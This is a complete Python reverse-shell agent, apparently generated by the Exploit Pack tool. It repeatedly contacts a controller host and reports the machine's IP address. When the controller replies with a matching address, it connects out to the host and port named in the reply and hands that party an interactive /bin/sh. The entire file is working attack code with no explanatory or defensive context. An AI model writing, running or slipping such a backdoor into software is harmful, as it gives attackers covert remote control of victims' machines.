# Shell Script created using Exploit Pack
# http://www.exploitpack.com - support@exploitpack.com
import socket,subprocess,errno,time,os,signal,sys

class Agent:
    def __init__(self, target, port):
        self.hostname = target
        self.port = int(port)
    def run_worker(self):
        while True:
            try:
                print "[*] Poking server"
                self.poke()
            except Exception,exc:
                  time.sleep(2)
            else:
                print "[*] Hello Server"
        else:
            raise
    def poke(self):
        whoami = ([(checkip.connect(('8.8.8.8', 80)), checkip.getsockname()[0], checkip.close()) for checkip in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.hostname, self.port))
        s.sendall(whoami)
        data = s.recv(1024)
        split = data.split(":")
        if whoami == split[0]:
            print "[*] Connecting"
            sterminal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sterminal.connect((split[1], int(split[2])))
            os.dup2(sterminal.fileno(), 0)
            os.dup2(sterminal.fileno(), 1)
            os.dup2(sterminal.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
        s.close()
hostname = "127.0.1.1"
port = "1234"
new = Agent(hostname, port)
new.run_worker()
